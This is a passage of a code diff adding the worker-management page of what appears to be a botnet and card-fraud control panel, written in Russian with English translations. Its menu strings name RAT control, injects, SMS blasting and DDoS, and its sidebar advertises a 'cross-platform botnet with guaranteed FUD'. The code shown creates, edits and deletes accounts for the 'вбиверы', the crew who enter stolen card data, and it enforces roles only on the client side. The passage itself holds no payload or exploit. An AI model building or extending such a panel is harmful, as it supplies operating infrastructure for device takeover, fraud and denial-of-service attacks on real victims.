+                    <div class="form-hint" data-i18n="hint_login">Будет использоваться для входа на панель</div>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" data-i18n="label_password">Пароль</label>
+                    <input type="text" class="form-input" id="workerPassword" data-i18n="ph_password_auto" placeholder="Оставьте пустым для авто-генерации">
+                    <div class="form-hint" data-i18n="hint_min6">Минимум 6 символов</div>
+                </div>
+
+                <div class="credentials-box" id="credentialsBox" style="display: none;">
+                    <h4><i data-feather="check-circle"></i> <span data-i18n="credentials_title">Данные для входа</span></h4>
+                    <div class="credential-item">
+                        <span class="credential-label" data-i18n="cred_login">Логин</span>
+                        <span>
+                            <span class="credential-value" id="createdLogin">-</span>
+                            <button class="copy-btn" onclick="copyToClipboard('createdLogin')"><i data-feather="copy"></i></button>
+                        </span>
+                    </div>
+                    <div class="credential-item">
+                        <span class="credential-label" data-i18n="cred_password">Пароль</span>
+                        <span>
+                            <span class="credential-value" id="createdPassword">-</span>
+                            <button class="copy-btn" onclick="copyToClipboard('createdPassword')"><i data-feather="copy"></i></button>
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="hideCreateModal()" data-i18n="btn_cancel">Отмена</button>
+                <button class="btn btn-primary" id="createBtn" onclick="createWorker()">
+                    <i data-feather="plus"></i>
+                    <span data-i18n="btn_create">Создать</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    
+    <div class="modal-overlay" id="deleteModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h2 data-i18n="modal_delete_title">Удалить вбивера</h2>
+                <button class="modal-close" onclick="hideDeleteModal()">
+                    <i data-feather="x"></i>
+                </button>
+            </div>
+            <div class="modal-body">
+                <p><span data-i18n="delete_confirm_pre">Вы уверены, что хотите удалить вбивера</span> <strong id="deleteWorkerName">-</strong><span data-i18n="delete_confirm_post">?</span></p>
+                <p style="color: var(--text-dim); font-size: 0.8rem; margin-top: 8px;" data-i18n="delete_irreversible">Это действие нельзя отменить.</p>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="hideDeleteModal()" data-i18n="btn_cancel">Отмена</button>
+                <button class="btn btn-danger" onclick="confirmDelete()">
+                    <i data-feather="trash-2"></i>
+                    <span data-i18n="btn_delete">Удалить</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Edit Modal -->
+    <div class="modal-overlay" id="editModal">
+        <div class="modal">
+            <div class="modal-header">
+                <h2 data-i18n="modal_edit_title">Редактировать вбивера</h2>
+                <button class="modal-close" onclick="hideEditModal()">
+                    <i data-feather="x"></i>
+                </button>
+            </div>
+            <div class="modal-body">
+                <input type="hidden" id="editWorkerOldLogin">
+                
+                <div class="form-group">
+                    <label class="form-label" data-i18n="label_worker_name">Имя вбивера</label>
+                    <input type="text" class="form-input" id="editWorkerName" data-i18n="ph_name" placeholder="Имя">
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" data-i18n="label_login_edit">Логин</label>
+                    <input type="text" class="form-input" id="editWorkerLogin" data-i18n="ph_login_edit" placeholder="Логин для входа">
+                    <div class="form-hint" data-i18n="hint_login_change">Изменение логина потребует нового входа</div>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" data-i18n="label_new_password">Новый пароль</label>
+                    <input type="text" class="form-input" id="editWorkerPassword" data-i18n="ph_password_keep" placeholder="Оставьте пустым, чтобы не менять">
+                    <div class="form-hint" data-i18n="hint_min6">Минимум 6 символов</div>
+                </div>
+
+                <div class="credentials-box" id="editCredentialsBox" style="display: none;">
+                    <h4><i data-feather="check-circle"></i> <span data-i18n="new_credentials_title">Новые данные для входа</span></h4>
+                    <div class="credential-item">
+                        <span class="credential-label" data-i18n="cred_login">Логин</span>
+                        <span>
+                            <span class="credential-value" id="editedLogin">-</span>
+                            <button class="copy-btn" onclick="copyToClipboard('editedLogin')"><i data-feather="copy"></i></button>
+                        </span>
+                    </div>
+                    <div class="credential-item">
+                        <span class="credential-label" data-i18n="cred_password">Пароль</span>
+                        <span>
+                            <span class="credential-value" id="editedPassword">-</span>
+                            <button class="copy-btn" onclick="copyToClipboard('editedPassword')"><i data-feather="copy"></i></button>
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="hideEditModal()" data-i18n="btn_cancel">Отмена</button>
+                <button class="btn btn-primary" id="saveEditBtn" onclick="saveWorkerEdit()">
+                    <i data-feather="save"></i>
+                    <span data-i18n="btn_save">Сохранить</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    
+    <div class="toast" id="toast">
+        <i data-feather="check-circle"></i>
+        <span id="toastMessage" data-i18n="toast_saved">Сохранено</span>
+    </div>
+
+    <script>
+        let LANG = localStorage.getItem('rw_panel_lang') || 'ru';
+        const I18N = {
+            ru: {
+                nav_main: 'Основное', nav_dashboard: 'Дашборд', nav_devices: 'Устройства',
+                nav_management: 'Управление', nav_rat: 'RAT Управление', nav_injects: 'Инжекты',
+                nav_blast: 'SMS Рассылка', nav_ddos: 'DDoS', nav_settings_section: 'Настройки',
+                nav_workers: 'Вбиверы', nav_settings: 'Настройки',
+                sidebar_credits: 'Актуальные данные', logout: 'Выйти',
+                role_ts: 'ТС • Полный доступ', role_worker: 'Вбивер',
+                page_title: 'Управление вбиверами', btn_create_worker: 'Создать вбивера',
+                th_name_login: 'Имя / Логин', th_created: 'Создан', th_actions: 'Действия',
+                modal_create_title: 'Создать вбивера', label_worker_name: 'Имя вбивера',
+                ph_worker_name: 'Например: Иван', hint_display_name: 'Отображаемое имя в панели',
+                label_login: 'Логин для входа', ph_login: 'Например: worker1',
+                hint_login: 'Будет использоваться для входа на панель', label_password: 'Пароль',
+                ph_password_auto: 'Оставьте пустым для авто-генерации', hint_min6: 'Минимум 6 символов',
+                credentials_title: 'Данные для входа', cred_login: 'Логин', cred_password: 'Пароль',
+                btn_cancel: 'Отмена', btn_create: 'Создать',
+                modal_delete_title: 'Удалить вбивера',
+                delete_confirm_pre: 'Вы уверены, что хотите удалить вбивера',
+                delete_confirm_post: '?',
+                delete_irreversible: 'Это действие нельзя отменить.', btn_delete: 'Удалить',
+                modal_edit_title: 'Редактировать вбивера', ph_name: 'Имя',
+                label_login_edit: 'Логин', ph_login_edit: 'Логин для входа',
+                hint_login_change: 'Изменение логина потребует нового входа',
+                label_new_password: 'Новый пароль', ph_password_keep: 'Оставьте пустым, чтобы не менять',
+                new_credentials_title: 'Новые данные для входа', btn_save: 'Сохранить',
+                toast_saved: 'Сохранено',
+                access_denied: 'Доступ запрещён. Только ТС может управлять вбиверами.',
+                error_loading: 'Ошибка загрузки', empty_no_workers: 'Нет вбиверов',
+                empty_create_first: 'Создайте первого вбивера для вашей команды',
+                tooltip_edit: 'Редактировать', tooltip_delete: 'Удалить',
+                error_fill_name: 'Заполните имя вбивера', error_login_exists: 'Такой логин уже существует',
+                worker_created: 'Вбивер создан', error_prefix: 'Ошибка: ',
+                error_unknown: 'Неизвестная ошибка', error_create: 'Ошибка создания',
+                copied: 'Скопировано', error_fill_name_short: 'Заполните имя',
+                error_fill_login: 'Заполните логин', error_password_min6: 'Пароль минимум 6 символов',
+                password_unchanged: '(не изменён)', worker_updated: 'Вбивер обновлён',
+                error_save: 'Ошибка сохранения', worker_deleted: 'Вбивер удалён',
+                error_delete: 'Ошибка удаления',
+                crack_sidebar: 'Кроссплатформенный ботнет<br>с гарантией FUD',
+            },
+            en: {
+                nav_main: 'Main', nav_dashboard: 'Dashboard', nav_devices: 'Devices',
+                nav_management: 'Management', nav_rat: 'RAT Control', nav_injects: 'Injects',
+                nav_blast: 'SMS Blast', nav_ddos: 'DDoS', nav_settings_section: 'Settings',
+                nav_workers: 'Workers', nav_settings: 'Settings',
+                sidebar_credits: 'Contacts', logout: 'Log out',
+                role_ts: 'TS • Full access', role_worker: 'Worker',
+                page_title: 'Workers Management', btn_create_worker: 'Create Worker',
+                th_name_login: 'Name / Login', th_created: 'Created', th_actions: 'Actions',
+                modal_create_title: 'Create Worker', label_worker_name: 'Worker name',
+                ph_worker_name: 'E.g.: Ivan', hint_display_name: 'Display name in the panel',
+                label_login: 'Login', ph_login: 'E.g.: worker1',
+                hint_login: 'Used to sign in to the panel', label_password: 'Password',
+                ph_password_auto: 'Leave empty to auto-generate', hint_min6: 'Minimum 6 characters',
+                credentials_title: 'Login credentials', cred_login: 'Login', cred_password: 'Password',
+                btn_cancel: 'Cancel', btn_create: 'Create',
+                modal_delete_title: 'Delete Worker',
+                delete_confirm_pre: 'Are you sure you want to delete worker',
+                delete_confirm_post: '?',
+                delete_irreversible: 'This action cannot be undone.', btn_delete: 'Delete',
+                modal_edit_title: 'Edit Worker', ph_name: 'Name',
+                label_login_edit: 'Login', ph_login_edit: 'Login',
+                hint_login_change: 'Changing login will require re-login',
+                label_new_password: 'New password', ph_password_keep: 'Leave empty to keep current',
+                new_credentials_title: 'New login credentials', btn_save: 'Save',
+                toast_saved: 'Saved',
+                access_denied: 'Access denied. Only TS can manage workers.',
+                error_loading: 'Loading error', empty_no_workers: 'No workers',
+                empty_create_first: 'Create the first worker for your team',
+                tooltip_edit: 'Edit', tooltip_delete: 'Delete',
+                error_fill_name: 'Enter worker name', error_login_exists: 'This login already exists',
+                worker_created: 'Worker created', error_prefix: 'Error: ',
+                error_unknown: 'Unknown error', error_create: 'Creation error',
+                copied: 'Copied', error_fill_name_short: 'Enter name',
+                error_fill_login: 'Enter login', error_password_min6: 'Password must be at least 6 characters',
+                password_unchanged: '(unchanged)', worker_updated: 'Worker updated',
+                error_save: 'Save error', worker_deleted: 'Worker deleted',
+                error_delete: 'Delete error',
+                crack_sidebar: 'Cross-platform botnet<br>with guaranteed FUD',
+            }
+        };
+        function L(k) { return (I18N[LANG] || I18N.ru)[k] || k; }
+        function applyI18n() {
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const k = el.getAttribute('data-i18n');
+                const v = L(k);
+                if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') el.placeholder = v;
+                else el.innerHTML = v;
+            });
+            document.querySelectorAll('[data-i18n-title]').forEach(el => {
+                el.title = L(el.getAttribute('data-i18n-title'));
+            });
+        }
+        function toggleLang() {
+            LANG = LANG === 'ru' ? 'en' : 'ru';
+            localStorage.setItem('rw_panel_lang', LANG);
+            applyI18n();
+            const btn = document.getElementById('langToggleBtn');
+            if (btn) btn.textContent = LANG.toUpperCase();
+        }
+
+        feather.replace();
+
+        const API_URL = window.location.origin;
+        const teamId = localStorage.getItem('panel_team_id');
+        const userRole = localStorage.getItem('panel_role') || 'worker';
+        
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text || '';
+            return div.innerHTML;
+        }
+
+        function escapeAttr(text) {
+            return escapeHtml(text).replace(/'/g, '&#39;').replace(/"/g, '&quot;');
+        }
+        const userLogin = localStorage.getItem('panel_login') || '';
+
+        if (!teamId) {
+            fetch('/api/validate_session', { method: 'POST', headers: {'Content-Type':'application/json'}, body: '{}' })
+                .then(r => r.json())
+                .then(d => {
+                    if (!d.valid) { window.location.href = '/login.html'; return; }
+                    localStorage.setItem('panel_team_id', d.team_id);
+                    localStorage.setItem('panel_role', d.role || 'ts');
+                    localStorage.setItem('panel_login', d.login || '');
+                    localStorage.setItem('panel_display_name', d.display_name || d.login || '');
+                    window.location.reload();
+                });
+        }
+
+        if (userRole !== 'ts') {
+            alert(L('access_denied'));
+            window.location.href = 'dashboard.html';
+        }
+
+        const userName = localStorage.getItem('panel_display_name') || localStorage.getItem('panel_login') || 'User';
+        document.getElementById('userName').textContent = userName;
+        document.getElementById('userAvatar').textContent = userName[0].toUpperCase();
+        document.getElementById('userRole').textContent = userRole === 'ts' ? L('role_ts') : L('role_worker');
+
+        const logoCanvas = document.getElementById('logoParticles');
+        const logoCtx = logoCanvas.getContext('2d');
+        let logoParticles = [];
+
+        const animStartTime = parseInt(localStorage.getItem('particleStartTime') || Date.now());
+        if (!localStorage.getItem('particleStartTime')) {
+            localStorage.setItem('particleStartTime', animStartTime);
+        }
+
+        function resizeLogoCanvas() {
+            const container = logoCanvas.parentElement;
+            logoCanvas.width = container.offsetWidth;
+            logoCanvas.height = container.offsetHeight;
+        }
+
+        class LogoParticle {
+            constructor(index) {
+                this.index = index;
+                this.reset();
+            }
+
+            reset() {
+
+                const seed = this.index * 137.5;
+
+                this.baseX = (Math.sin(seed) * 0.5 + 0.5) * logoCanvas.width;
+                this.baseY = (Math.cos(seed * 2.3) * 0.5 + 0.5) * logoCanvas.height;
+                this.size = (Math.sin(seed * 3.7) * 0.5 + 0.5) * 2 + 1;
+
+                this.orbitRadius = (Math.sin(seed * 4.1) * 0.5 + 0.5) * 30 + 15;
+                this.orbitSpeed = (Math.sin(seed * 5.3) * 0.5 + 0.5) * 0.5 + 0.3;
+                this.driftX = (Math.sin(seed * 6.7) - 0.5) * 0.3;
+                this.driftY = (Math.cos(seed * 7.1) - 0.5) * 0.3;
+                this.opacity = (Math.sin(seed * 11.7) * 0.5 + 0.5) * 0.5 + 0.3;
+                this.pulseOffset = seed;
+                this.phaseOffset = seed * 0.1;
+            }
+
+            update(globalTime) {
+                const elapsed = globalTime * 0.001;
+                this.pulse = elapsed * 2 + this.pulseOffset;
+
+                const angle = elapsed * this.orbitSpeed + this.phaseOffset;
+                this.x = this.baseX + Math.cos(angle) * this.orbitRadius + Math.sin(elapsed * 0.1 + this.phaseOffset) * 20;
+                this.y = this.baseY + Math.sin(angle * 0.7) * this.orbitRadius * 0.6 + Math.cos(elapsed * 0.15 + this.phaseOffset) * 15;
+
+                if (this.x < -10) this.x += logoCanvas.width + 20;
+                if (this.x > logoCanvas.width + 10) this.x -= logoCanvas.width + 20;
+                if (this.y < -10) this.y += logoCanvas.height + 20;
+                if (this.y > logoCanvas.height + 10) this.y -= logoCanvas.height + 20;
+            }
+
+            draw() {
+                const pulseOpacity = this.opacity * (0.6 + Math.sin(this.pulse) * 0.4);
+
+                const gradient = logoCtx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.size * 5);
+                gradient.addColorStop(0, `rgba(230, 57, 70, ${pulseOpacity})`);
+                gradient.addColorStop(0.5, `rgba(230, 57, 70, ${pulseOpacity * 0.3})`);
+                gradient.addColorStop(1, 'transparent');
+                logoCtx.beginPath();
+                logoCtx.arc(this.x, this.y, this.size * 5, 0, Math.PI * 2);
+                logoCtx.fillStyle = gradient;
+                logoCtx.fill();
+
+                logoCtx.beginPath();
+                logoCtx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                logoCtx.fillStyle = `rgba(255, 180, 180, ${pulseOpacity})`;
+                logoCtx.fill();
+            }
+        }
+
+        function initLogoParticles() {
+            logoParticles = [];
+            for (let i = 0; i < 15; i++) {
+                logoParticles.push(new LogoParticle(i));
+            }
+        }
+
+        function animateLogoParticles() {
+            const globalTime = Date.now() - animStartTime;
+            logoCtx.clearRect(0, 0, logoCanvas.width, logoCanvas.height);
+
+            logoParticles.forEach(p => p.update(globalTime));
+
+            logoCtx.lineWidth = 0.5;
+            for (let i = 0; i < logoParticles.length; i++) {
+                for (let j = i + 1; j < logoParticles.length; j++) {
+                    const dx = logoParticles[i].x - logoParticles[j].x;
+                    const dy = logoParticles[i].y - logoParticles[j].y;
+                    const distance = Math.sqrt(dx * dx + dy * dy);
+                    
+                    if (distance < 80) {
+                        const opacity = (1 - distance / 80) * 0.4;
+                        logoCtx.strokeStyle = `rgba(230, 57, 70, ${opacity})`;
+                        logoCtx.beginPath();
+                        logoCtx.moveTo(logoParticles[i].x, logoParticles[i].y);
+                        logoCtx.lineTo(logoParticles[j].x, logoParticles[j].y);
+                        logoCtx.stroke();
+                    }
+                }
+            }
+
+            logoParticles.forEach(p => p.draw());
+            
+            requestAnimationFrame(animateLogoParticles);
+        }
+
+        resizeLogoCanvas();
+        initLogoParticles();
+        animateLogoParticles();
+
+        window.addEventListener('resize', () => {
+            resizeLogoCanvas();
+            initLogoParticles();
+        });
+
+        let workers = [];
+        let deleteWorkerLogin = null;
+
+        async function loadWorkers() {
+            try {
+                const response = await fetch(`${API_URL}/api/workers/${teamId}?login=${encodeURIComponent(userLogin)}&role=ts`);
+                if (response.ok) {
+                    const data = await response.json();
+                    workers = (data.workers || []).map((w, i) => ({
+                        id: i + 1,
+                        login: w.login,
+                        name: w.name || w.display_name || w.login,
+                        created: w.created_at || new Date().toISOString()
+                    }));
+                    renderWorkers();
+                }
+            } catch (e) {
+                console.error('Load workers error:', e);
+                showToast(L('error_loading'), 'error');
+            }
+        }
+
+        async function logout() {
+            try { await fetch('/api/logout', { method: 'POST' }); } catch(e) {}
+            localStorage.removeItem('panel_team_id');
+            localStorage.removeItem('panel_role');
+            localStorage.removeItem('panel_login');
+            localStorage.removeItem('panel_display_name');
+            window.location.href = 'login.html';
+        }
+        
+        document.querySelector('.user-logout')?.addEventListener('click', logout);
+
+        function renderWorkers() {
+            const container = document.getElementById('workersContainer');
+            
+            if (workers.length === 0) {
+                container.innerHTML = `
+                    <div class="empty-state">
+                        <i data-feather="users"></i>
+                        <h3>${L('empty_no_workers')}</h3>
+                        <p>${L('empty_create_first')}</p>
+                    </div>
+                `;
+                feather.replace();
+                return;
+            }
+            
+            container.innerHTML = workers.map(worker => {
+                const safeName = escapeHtml(worker.name || worker.login);
+                const safeLogin = escapeHtml(worker.login);
+                return `
+                <div class="worker-row" data-login="${escapeAttr(worker.login)}">
+                    <div class="worker-avatar">${safeName[0].toUpperCase()}</div>
+                    <div class="worker-info">
+                        <div class="worker-name">${safeName}</div>
+                        <div class="worker-login">${safeLogin}</div>
+                    </div>
+                    <div class="worker-date">${formatDate(worker.created)}</div>
+                    <div class="worker-actions">
+                        <button class="action-btn" title="${L('tooltip_edit')}" onclick="editWorker('${escapeAttr(worker.login)}')">
+                            <i data-feather="edit-2"></i>
+                        </button>
+                        <button class="action-btn danger" title="${L('tooltip_delete')}" onclick="deleteWorker(${parseInt(worker.id)})">
+                            <i data-feather="trash-2"></i>
+                        </button>
+                    </div>
+                </div>
+            `}).join('');
+            
+            feather.replace();
+        }
+
+        function formatDate(dateStr) {
+            const date = new Date(dateStr);
+            return date.toLocaleDateString('ru-RU', { day: '2-digit', month: '2-digit', year: 'numeric' });
+        }
+
+        function showToast(message, type = 'success') {
+            const toast = document.getElementById('toast');
+            const toastMessage = document.getElementById('toastMessage');
+            
+            toast.className = 'toast ' + type;
+            toastMessage.textContent = message;
+            
+            const icon = toast.querySelector('svg');
+            icon.setAttribute('data-feather', type === 'success' ? 'check-circle' : 'x-circle');
+            feather.replace();
+            
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        function generatePassword() {
+            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let password = '';
+            for (let i = 0; i < 12; i++) {
+                password += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return password;
+        }
+
+        function showCreateModal() {
+            document.getElementById('workerName').value = '';
+            document.getElementById('workerLogin').value = '';
+            document.getElementById('workerPassword').value = '';
+            document.getElementById('credentialsBox').style.display = 'none';
+            document.getElementById('createBtn').style.display = 'flex';
+            document.getElementById('createModal').classList.add('show');
+        }
+
+        function hideCreateModal() {
+            document.getElementById('createModal').classList.remove('show');
+        }
+
+        async function createWorker() {
+            const name = document.getElementById('workerName').value.trim();
+            const login = document.getElementById('workerLogin').value.trim();
+            let password = document.getElementById('workerPassword').value.trim();
+            
+            if (!name) {
+                showToast(L('error_fill_name'), 'error');
+                return;
+            }
+            
+            if (login && workers.some(w => w.login === login)) {
+                showToast(L('error_login_exists'), 'error');
+                return;
+            }
+
+            try {
+                const response = await fetch(`${API_URL}/api/workers/${teamId}?login=${encodeURIComponent(userLogin)}&role=ts`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        role: 'worker',
+                        name: name,
+                        login: login || undefined,
+                        password: password || undefined
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok && data.success && data.worker) {
+                    document.getElementById('createdLogin').textContent = data.worker.login;
+                    document.getElementById('createdPassword').textContent = data.worker.password;
+                    document.getElementById('credentialsBox').style.display = 'block';
+                    document.getElementById('createBtn').style.display = 'none';
+
+                    await loadWorkers();
+                    
+                    showToast(L('worker_created'));
+                } else {
+                    showToast(L('error_prefix') + (data.error || L('error_unknown')), 'error');
+                }
+            } catch (e) {
+                console.error('Create worker error:', e);
+                showToast(L('error_create'), 'error');
+            }
+        }
+
+        function copyToClipboard(elementId) {
+            const text = document.getElementById(elementId).textContent;
+            navigator.clipboard.writeText(text);
+            showToast(L('copied'));
+        }
+
+        function editWorker(login) {
+            const worker = workers.find(w => w.login === login);
+            if (!worker) return;
+            
+            document.getElementById('editWorkerOldLogin').value = worker.login;
+            document.getElementById('editWorkerName').value = worker.name || '';
+            document.getElementById('editWorkerLogin').value = worker.login;
+            document.getElementById('editWorkerPassword').value = '';
+            document.getElementById('editCredentialsBox').style.display = 'none';
+            document.getElementById('saveEditBtn').style.display = 'flex';
+            document.getElementById('editModal').classList.add('show');
+        }
+
+        function hideEditModal() {
+            document.getElementById('editModal').classList.remove('show');
+        }
+
+        async function saveWorkerEdit() {
+            const oldLogin = document.getElementById('editWorkerOldLogin').value;
+            const newName = document.getElementById('editWorkerName').value.trim();
+            const newLogin = document.getElementById('editWorkerLogin').value.trim();
+            const newPassword = document.getElementById('editWorkerPassword').value.trim();
+
+            if (!newName) {
+                showToast(L('error_fill_name_short'), 'error');
+                return;
+            }
+
+            if (!newLogin) {
+                showToast(L('error_fill_login'), 'error');
+                return;
+            }
+
+            if (newPassword && newPassword.length < 6) {
+                showToast(L('error_password_min6'), 'error');
+                return;
+            }
+
+            if (newLogin !== oldLogin && workers.some(w => w.login === newLogin)) {
+                showToast(L('error_login_exists'), 'error');
+                return;
+            }
+
+            try {
+                const response = await fetch(`${API_URL}/api/workers/${teamId}/${oldLogin}?login=${encodeURIComponent(userLogin)}&role=ts`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        role: 'ts',
+                        name: newName,
+                        login: newLogin,
+                        password: newPassword || undefined
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok && data.success) {
+                    // Show new credentials if password was changed
+                    if (newPassword || newLogin !== oldLogin) {
+                        document.getElementById('editedLogin').textContent = newLogin;
+                        document.getElementById('editedPassword').textContent = newPassword || L('password_unchanged');
+                        document.getElementById('editCredentialsBox').style.display = 'block';
+                        document.getElementById('saveEditBtn').style.display = 'none';
+                    } else {
+                        hideEditModal();
+                    }
+
+                    await loadWorkers();
+                    showToast(L('worker_updated'));
+                } else {
+                    showToast(L('error_prefix') + (data.error || L('error_unknown')), 'error');
+                }
+            } catch (e) {
+                console.error('Edit worker error:', e);
+                showToast(L('error_save'), 'error');
+            }
+        }
+
+        // Mobile menu functions
+        function toggleSidebar() {
+            document.getElementById('sidebar').classList.toggle('open');
+            document.getElementById('sidebarOverlay').classList.toggle('show');
+        }
+
+        function closeSidebar() {
+            document.getElementById('sidebar').classList.remove('open');
+            document.getElementById('sidebarOverlay').classList.remove('show');
+        }
+
+        function deleteWorker(id) {
+            const worker = workers.find(w => w.id === id);
+            if (!worker) return;
+            
+            deleteWorkerLogin = worker.login;
+            document.getElementById('deleteWorkerName').textContent = worker.name;
+            document.getElementById('deleteModal').classList.add('show');
+        }
+
+        function hideDeleteModal() {
+            document.getElementById('deleteModal').classList.remove('show');
+            deleteWorkerLogin = null;
+        }
+
+        async function confirmDelete() {
+            if (deleteWorkerLogin) {
+                try {
+                    const response = await fetch(`${API_URL}/api/workers/${teamId}/${deleteWorkerLogin}?login=${encodeURIComponent(userLogin)}&role=ts`, {
+                        method: 'DELETE',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ role: 'ts' })
+                    });
+                    
+                    if (response.ok) {
+                        await loadWorkers();
+                        hideDeleteModal();
+                        showToast(L('worker_deleted'));
+                    } else {
+                        const data = await response.json();
+                        showToast(L('error_prefix') + (data.error || L('error_unknown')), 'error');
+                    }
+                } catch (e) {
+                    console.error('Delete worker error:', e);
+                    showToast(L('error_delete'), 'error');
+                }
+            }
+        }
+
+        loadWorkers();
+        document.getElementById('langToggleBtn').textContent = LANG.toUpperCase();
+        applyI18n();
+    </script>
+</body>
+</html>
